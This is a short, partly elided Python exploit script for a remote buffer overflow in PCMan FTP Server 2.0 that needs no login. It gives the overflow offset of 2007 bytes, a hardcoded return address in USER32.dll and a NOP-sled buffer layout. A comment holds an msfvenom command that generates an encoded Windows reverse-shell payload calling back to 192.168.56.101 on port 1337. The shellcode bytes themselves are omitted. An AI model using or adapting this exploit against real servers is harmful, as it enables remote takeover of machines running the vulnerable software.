#!/usr/bin/env python3
# Exploit Title: PCMan FTP Server 2.0 - Remote Buffer Overflow - no login
# Date: 8 August 2024
...
import socket, struct, sys, os,subprocess as sp;
...
try:
	...
	# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=1337 EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20\x3d\x3f"
	shellcode=b""
	...
	eip= struct.pack('<L', 0x75318293) # return address USER32.dll and you must change it

	'''
	payload length is: 5000 bytes
	EIP overwritten in 2007 place which make a jmp to ESP
	ESP include the shellcode and number of \x90 just for place
	'''

	buf = b"A"*2007+ eip +b"\x90"*50 + shellcode + b"\x90"*(5000-2011-len(shellcode))
